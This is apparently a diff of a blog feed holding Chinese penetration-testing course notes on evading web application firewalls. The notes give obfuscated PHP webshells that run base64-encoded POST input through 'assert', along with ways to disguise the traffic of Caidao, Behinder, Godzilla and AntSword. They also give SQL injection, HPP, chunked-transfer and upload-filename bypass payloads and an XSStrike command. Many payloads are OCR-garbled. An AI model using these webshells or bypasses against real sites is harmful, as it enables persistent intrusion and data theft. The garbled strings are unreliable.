+<h1 id="第七十七天WAF攻防-权限控制-代码免杀-异或运算-变量覆盖-混淆加密-传参"><a href="#第七十七天WAF攻防-权限控制-代码免杀-异或运算-变量覆盖-混淆加密-传参" class="headerlink" title="第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参"></a>第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参</h1><h4 id="知识点：-53"><a href="#知识点：-53" class="headerlink" title="知识点："></a>知识点：</h4><p>1、脚本后门基础&amp;原理<br>2、脚本后门查杀绕过机制<br>3、权限维持覆盖&amp;传参&amp;加密&amp;异或等<br>代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)<br>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等<br>2、工具行为层免杀菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
+<h4 id="章节点：-7"><a href="#章节点：-7" class="headerlink" title="章节点："></a>章节点：</h4><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段</p>
+<h4 id="补充点："><a href="#补充点：" class="headerlink" title="补充点："></a>补充点：</h4><p>1、什么是WAF?<br>Veb Application Firewall(web应用防火墙)，一种公认的说法是”web应用防火墙通过执<br>行一系列针对HTTP&#x2F;HTTPS的安全策路来专门为wb应用提供保护的一款产品。<br>基本可以分为以下4种<br>软件型WAF<br>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检测服务器上<br>是否有webshell,是否有文件被创建等。<br>硬件型WAF<br>以硬件形式部署在链路中，支持多种部暑方式。当串联到链路上时可以拦截恶意流重，在<br>旁路监听模式时只记录攻击但是不进行拦截。<br>云WAF<br>一股以反向代理的形式工作，通过配置后，使对网站的请求数据优先经过WAF主机，在<br>WAF主机对数据进行过滤后再传给服务器<br>网站内置的WAF<br>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，<br>对输入的参数进行敏感词检测测啊什么的</p>
+<h4 id="演示案例：-47"><a href="#演示案例：-47" class="headerlink" title="演示案例："></a>演示案例：</h4><p>基础-脚本后门控制原理代码解释<br>原理-脚本后门查杀机制-函数&amp;行为<br>代码-脚本后门免杀变异-覆盖&amp;传参<br>代码-脚本后门免杀变异-异或&amp;加密<br>拓展脚本后门脚本类型-JSP&amp;ASPX</p>
+<p>基础脚本后门控制原理代码解释<br>对比工具代码菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
+<p>原理脚本后门查杀机制函数&amp;行为<br>对比WAF规则数匹配&amp;工具指纹等</p>
+<p>代码脚本后门免杀变异夏盖&amp;传参<br>1.php传参带入</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$a</span>.<span class="string">&#x27;ert&#x27;</span>;</span><br><span class="line"><span class="variable">$aa</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>])):</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
+
+<p>2.php变量覆盖</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>x&#x3D;cGhwaw5mbygpow&#x3D;&#x3D;</p>
+<p>#代码脚本后门兔杀变异异或&amp;加密<br>3.php加密变异<br><a href="http://www.phpjm.net/">http://www.phpjm.net</a><br><a href="https://www.phpjms.com/">https://www.phpjms.com/</a><br><a href="http://1.15.155.76.1234/">http://1.15.155.76.1234/</a><br>思路：将webshell加密，上传过程中则不会被检测出，然后传参时使用参数加密绕过参数检测</p>
+<p>4.php异或运算 无字符webshell<br>import requests<br>import time<br>import threading.queue</p>
+<p>拓展即本后门脚本类型JSP&amp;ASPX</p>
+<p>5.php脚本生成器<br>Webshell-venom<br>ASP PHP JSP ASPX</p>
+<h1 id="第78天-WAF攻防-荚刀-冰蝎-哥斯拉-流量通讯-特征绕过-检测反制-感知"><a href="#第78天-WAF攻防-荚刀-冰蝎-哥斯拉-流量通讯-特征绕过-检测反制-感知" class="headerlink" title="第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知"></a>第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知</h1><h4 id="知识点：-54"><a href="#知识点：-54" class="headerlink" title="知识点："></a>知识点：</h4><p>1、菜刀-流量&amp;通讯&amp;检测8绕过<br>2、冰竭-流量&amp;通计8检测&amp;绕过<br>3、哥斯拉-流量&amp;通讯&amp;检测&amp;绕过<br>代码块&amp;传参数据&amp;工具指纹等表面&amp;行为）<br>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等<br>2、工具行为层免杀菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
+<h4 id="章节点：-8"><a href="#章节点：-8" class="headerlink" title="章节点："></a>章节点：</h4><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段。</p>
+<p>可以分为下面三种检测的，即WAF、入侵检测平台、威胁感知平台。检测的技术可以分为正则匹配、机器语言、行为分析。一般那种开源的就是用的正则匹配，或者说一些比较垃圾的项目，因为用正则匹配的话比较容易绕过，使用加密、编码、分段等操作即可绕过。这个分段就是把一些特征流量分段发送，比如他检测POST这个东西，你可以中间加点，然后分成几个去表示。而行为分析则不看你过滤的函数，而是看这个代码的最终行为是什么，然后进行分析，如果过探测到行为比较危险就会拦截，而这个机器语言也是比较高级的东西，小迪也没解释清。一般商业的都是行为分析和机器语言去检测，开源的是正则。最终的发展方向呢也是往机器语言和行为分析发展。</p>
+<blockquote>
+<p>正则表达式是 WAF 中最常用的技术之一，可用于实现基于模式匹配的规则和策略。</p>
+<p>机器语言是计算机能够理解和执行的指令集，与高级编程语言不同，它使用二进制代码来表示操作和数据。在 WAF<br>中，机器语言可能用于处理和分析网络流量，以及执行特定的安全策略和行为分析。</p>
+<p>行为分析是一种安全技术，旨在识别恶意活动和攻击，例如 SQL 注入、跨站脚本攻击等。在 WAF 中，行为分析可以通过检查 Web<br>请求的属性、参数、来源 IP 等信息，从而确定该请求是否是合法和安全的</p>
+</blockquote>
+<h4 id="演示案例：-48"><a href="#演示案例：-48" class="headerlink" title="演示案例："></a>演示案例：</h4><p>菜刀-流量&amp;绕过&amp;特征&amp;检测<br>waf告警日志中显示策略匹配到eval post</p>
+<p>通过wireshark抓包也可以看到数据包内容</p>
+<p>传入的值中xx变量经过php运行结果为base_64decode</p>
+<p>1、版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014$P0ST=$REQUEST2016可以</span><br></pre></td></tr></table></figure>
+
+<p>2、特征：<br>数据包流量特征：<br>1,请求包，中：ua头为百度爬虫<br>2,请求体中存在eval,base64等特征字符<br>3,请求体中传递的payload为base64编码，并且存在面定的<br>QGluaV9zZXQolmRpc3BsYXIfZXJyb3JzliwiMClpO0BzZXRfdGItZV9saW1pdCgwKTtpZih<br>QSFBfVkVSUOIPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1IKDApO307<br>ZWNobygiWEBZlik7J</p>
+<p>冰蝎-流量&amp;绕过&amp;特征&amp;检测<br>哥斯拉-流量&amp;绕过&amp;特征&amp;检测</p>
+<p>冰竭流量&amp;绕过&amp;特征&amp;检测</p>
+<p>请求正文全部为AES加密（AES加密的特则含有&#x2F;&#x2F;&#x2F;，大小写混杂，base64加密含有&#x3D;）AES加密需要知道密匙、偏移量、加密模式等</p>
+<p>1、介绍<br>冰蝎利用了服务器端的脚本语言加产功能，通讯的过程中，<br>消息体内容采用AES加密，基于特征值检测的安全产品无法查出。<br>2、通讯<br>以代码Key为密匙的AES加密解密过程<br>3、<br>特征：<br>1、User-agent:代码中定义<br>2、Pragma:no-cache<br>3.Content-Type:application&#x2F;x-www-form-urlencoded<br>4、Accept<br>text&#x2F;html,application&#x2F;xhtml+xml.application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng.*&#x2F;;q&#x3D;0.8.a<br>5.Accept-Encoding:gzip,deflate,br<br>6 Accept-Language:zh-CN,zh;q&#x3D;0.9,en-US:q&#x3D;0.8,en;q&#x3D;0.7</p>
+<p>哥斯拉流量&amp;绕过&amp;特征&amp;检测<br>1、通讯加密见图<br>2、特征：<br>1.User-Agent Mozilla&#x2F;5.0 (Windows NT 10.0;Win64;x64:rv:84.0)Gecko&#x2F;20100101<br>Firefox&#x2F;84.0<br>2.Accept text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,&#x2F;:q&#x3D;0.8<br>3.Accept-Language:zh-CN,zh;q&#x3D;0.8,zh-TW:q&#x3D;0.7,zh-HK:q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>4、Cookie:PHPSESSID&#x3D;ut2a51prs0470jvfe2q502o44 cookiet最后面存在-个”，”</p>
+<h4 id="拓展-冰蝎流量特征"><a href="#拓展-冰蝎流量特征" class="headerlink" title="拓展 冰蝎流量特征"></a>拓展 冰蝎流量特征</h4><p>冰蝎<br>冰蝎其最大特点就是对交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测<br>1、通过密钥协商的过程中的一些特征来检测其他<br>老版冰蝎工具在连接Webshell的时候会存在一个密钥协商的过程，这个过程是纯明文的数据交换，冰蝎存在这样的特征：发起一共两次的密钥协商，通过比较两次密钥协商的返回包中内容的不同部分来获取其中的密钥。<br>在这个协商过程中，防护设备可以结合URL、请求包和返回包的内容以及头部信息来综合进行判断，这种类型检测的优势是这部分的流程是冰蝎内置的实现，攻击者不太好进行修改绕过。而劣势是在大流量的环境下很容易引起大量的误报。<br>2、通过Shell交互过程中的HTTP请求特征来检测<br>冰蝎在发送HTTP请求时存在一些特征，例如其工具中内置了17个User-Agent头，在用户没有自定义的情况下会随机选择一个发送。但是这些User-Agent头大部分是一些老版本的浏览器或设备。这个类型检测的优势是检测方式比较简单，但是在大流量的环境下很容易引起误报，一般使用多个特征相结合的方法来改善误报的情况，并且这部分的特征通常是一些弱特征，攻击者可以通过定制请求头、使用代理等方式修改冰蝎的请求包很轻易的来绕过这类的检测。<br>3、通过Webshell上传时的流量特征来检测<br>在真实的攻击场景下，攻击者通常是通过文件上传、文件写入等方式来写入冰蝎的Webshell，所以流量设备也可以通过检测攻击场景的数据包来发现冰蝎的存在。这部分的流量形式主要取决于Web应用，是攻击者不好控制的，而且通常都是以明文形式进行传输，所以比较易于检测。<br>但是这种检测方式在遇到非文件上传等漏洞时，有可能无法捕捉到Webshell的特征。<br>冰蝎3.0<br>从防守方的角度看，这些改动中对防御设备影响最大的是第1点，也就是说，3.0版本的冰蝎不在有密钥协商的过程，从原理上直接绕过了大量流量检测设备（大部分设备是通过握手的行为来检测冰蝎的流量）</p>
+<p>蚁剑<br>1、编码器改造 蚁剑在数据包中实际上是将解码函数一同发送到服务端，那几个解码函数是没法加密的，所以产生一个很明显 的流量特征，蚁剑也支持使用者自定义编码器和解码器<br>2、请求头修改 蚁剑默认的数据包里都携带了特别明显的请求头信息：User-Agent: antSword&#x2F;v2.1，对WAF来说这简直 是自报家门</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>冰蝎改造将动态的AES密钥写死在webshell里，可以减少很多特征。<br>蚁剑就是将解码函数写死在webshell 里，也可以有效绕过WAF检测</p>
+<h1 id="第七十九天-WAF攻防-漏洞发现-协议-代理池-Goby-AWVS-Xray"><a href="#第七十九天-WAF攻防-漏洞发现-协议-代理池-Goby-AWVS-Xray" class="headerlink" title="第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray"></a>第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray</h1><h4 id="知识点：-55"><a href="#知识点：-55" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Http&#x2F;s&amp;Sock5协议<br>2、Awvs Xray&amp;Goby代理<br>3、Pxoxifier进程代理使用<br>4、Safedog&amp;BT&amp;Aliyun防护</p>
+<h4 id="演示案例：-49"><a href="#演示案例：-49" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Awws漏扫-Sadedog-白名单-内置<br>Awws漏扫-BT&amp;Aliyun-代理池-内置<br>Xray漏扫-BT&amp;Aliyun-Proxifier-.进程<br>Goby漏扫-BT&amp;Aliyun-Socket5-内置</p>
+<p>在漏洞发现中，WAF会对三个方向进行过滤拦截：<br>1、速度流量问题<br>2、工具的指纹被识别<br>3、工具的检测Poc或Payload</p>
+<p>Awvs漏扫-Sadedog-白名单-内置<br>加入白名单扫描，防Safedog拉黑IP</p>
+<p>Awws漏扫-BT&amp;Aliyun-代理池-内置</p>
+<p>Xray漏扫-BT&amp;Aliyun-Proxifier-.进程</p>
+<p>proxifier添加代理服务器</p>
+<p>添加代理规则 使得xray流量经过代理服务器访问目标站点</p>
+<p>Goby漏扫-BT&amp;Aliyun-Socket5-内置</p>
+<p>对于不通过https对网站或操作系统进行信息收集的程序可以使用socket5代理进行流量转发</p>
+<p>sqlmay设置代理设置随机UA头</p>
+<h1 id="第八十天-WAF攻防-漏洞利用-HPP污染-分块传输-垃圾数据"><a href="#第八十天-WAF攻防-漏洞利用-HPP污染-分块传输-垃圾数据" class="headerlink" title="第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据"></a>第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据</h1><h4 id="参考点："><a href="#参考点：" class="headerlink" title="参考点："></a>参考点：</h4><p>#将MySQL注入函数分为几类<br>拆分字符串函数：mid、1eft、1pad等<br>编码函数：ord、hex、a3ci等<br>运算函数：±*&#x2F;&amp;^！1 ike rlike reg等<br>空格替换部分：09、0a、0b、0c、0d等<br>关键数据函数：user（）、version（）、database（）等<br>然后将这些不同类型的函数组合拼接在一起</p>
+<p>上传参数名解析：明确哪些东西能修政？<br>Content-Di3 position:一般可更改<br>name:表单参数值，不能更改<br>filename:文件名，可以更改<br>Content-Type:文件MIME,视情况更改</p>
+<h4 id="演示案例：-50"><a href="#演示案例：-50" class="headerlink" title="演示案例："></a>演示案例：</h4><p>安全狗-SQL注入&amp;文件上传-知识点<br>安全狗-文件包含&amp;代码执行-知识点<br>BT&amp;Aliyun-SQL注入&amp;文件上传-知识点<br>BT&amp;Aliyun-文件包含&amp;代码执行-知识点</p>
+<p>安全狗-SQL注入&amp;文件上传-知识点</p>
+<p>SQL注入 <a href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a><br>关键字替换<br>使用like 代替 and<br>更换提交方式：<br>POST id&#x3D;-1 union select 1,2,3–+</p>
+<p>模拟文件上传传递数据<br>分块传输：更改数据请求格式<br>前提提交方式必须为POST<br><a href="https://github.com/cOny1/chunked-coding-converter">https://github.com/cOny1/chunked-coding-converter</a><br>HPP参数污染：id&#x3D;1&#x2F;**&amp;id&#x3D;-1号20 union号203e1ect号201,2,3号23*&#x2F;</p>
+<p>文件上传：换行解析&amp;垃圾溢出&amp;00干扰&amp;&#x3D;符号干扰&amp;参数模拟<br>filename&#x3D;a.php<br>filename&#x3D;”a.php<br>filename&#x3D;“a.php号%00”<br>垃圾数据；filename&#x3D;“a.php”<br>无限filename;filename&#x3D;“a,php”<br>filename&#x3D;&#x3D;“a.php”<br>filename&#x3D;“name&#x3D;’uploadfile.php”6</p>
+<p>filename&#x3D;“Content-Disposition:form-data.php”<br>filename&#x3D;&#x3D;“a.ph<br>p”</p>
+<p>BT&amp;Aliyun-文件包含&amp;代码执行-知识点<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>python xsstrike.py -u<br>“<a href="http://test.xiaodi8.com/pikachu/vul/xss/xss">http://test.xiaodi8.com/pikachu/vul/xss/xss</a> reflected get.php?mes<br>sage&#x3D;1&amp;submit&#x3D;submit”–proxy<br>txt&#x3D;Sy&#x3D;str replace(‘x’,‘’,‘pxhpxinxfo（）’);assert ($y);&amp;submit&#x3D;8688<br>F응90응E4용BA응A4<br>文件包含：没什么好说的就这几种<br>…·&#x2F;…1等</p>
+<p>安全狗：<br>注入ss文件上传拦截<br>rce文件包含等其他不拦截<br>宝塔：<br>注入上传拦截<br>rce文件包含Xss等其他不拦截<br>其中拦截的是关键字<br>aliyun<br>拦截的CC速度和后门信息收集和权限维持阶段拦截<br>漏洞利用他不拦截默认的版本（升级版本没测试）</p>
 ]]></content>
       <categories>
         <category>Web</category>
